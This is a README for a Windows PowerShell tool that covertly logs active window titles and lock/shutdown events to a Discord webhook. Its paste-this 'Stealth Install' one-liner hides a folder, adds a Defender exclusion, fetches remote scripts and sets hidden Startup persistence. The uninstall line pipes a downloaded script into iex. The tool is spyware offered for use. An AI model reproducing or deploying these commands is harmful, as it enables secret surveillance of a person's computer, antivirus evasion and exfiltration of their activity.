
# WinSystem-Sentry 🕵️‍♂️

A lightweight, native Windows 10 activity monitor designed for hardware security and usage tracking. This tool runs invisibly in the background and logs active window titles and system events (Lock/Shutdown) directly to a Discord Webhook.

---

### 🚀 Stealth Install (One-Liner)

1. Open **PowerShell (Admin)**.
2. Replace `YOUR_WEBHOOK_HERE` in the command below with your actual Discord Webhook URL.
3. Paste and press **Enter**:

```powershell
$hook="YOUR_WEBHOOK_HERE"; $dir="$env:LOCALAPPDATA\WinSystemDiagnostic"; mkdir $dir -Force; (New-Object -ComObject Shell.Application).Namespace($dir).Self.Attributes = 2; Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/09sychic/WinSystem-Sentry/main/WindowsDiagnosticeService.ps1" -OutFile "$dir\WindowsDiagnosticeService.ps1"; (Get-Content "$dir\WindowsDiagnosticeService.ps1") -replace 'YOUR_WEBHOOK_HERE', $hook | Set-Content "$dir\WindowsDiagnosticeService.ps1"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/09sychic/WinSystem-Sentry/main/Services.vbs" -OutFile "$dir\Services.vbs"; $s=New-Object -ComObject WScript.Shell; $link=$s.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemDiag.lnk"); $link.TargetPath="$dir\Services.vbs"; $link.WindowStyle=7; $link.Save(); wscript.exe "$dir\Services.vbs"
```

---

### 🛠️ Features

* **Total Stealth**: No taskbar icon, no console window (runs via VBScript wrapper).
* **Native Execution**: Uses only PowerShell and Win32 APIs—no `.exe` or Go required.
* **Automatic Persistence**: Installs a hidden shortcut to the Startup folder.
* **Power Event Tracking**: Logs when the system is Locked, Unlocked, or Shut Down.
* **Intelligent Logging**: Only sends a message when the active window changes to minimize network noise.

---

### 🗑️ Stealth Uninstall (One-Liner)

To wipe all traces of the monitor from the system, run this in **PowerShell (Admin)**:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex (Invoke-RestMethod '[https://raw.githubusercontent.com/09sychic/WinSystem-Sentry/main/uninstall.ps1](https://raw.githubusercontent.com/09sychic/WinSystem-Sentry/main/uninstall.ps1)')
```

---

### 📜 Repository Files

* **WindowsDiagnosticeService.ps1**: The core monitoring engine that tracks window titles.
* **Services.vbs**: The invisible "Ghost" launcher that hides the PowerShell window.
* **uninstall.ps1**: A clean-up utility that removes files, shortcuts, and background processes.

---

### 📜 Credits

* **Maintained by:** [09sychic](https://github.com/09sychic)
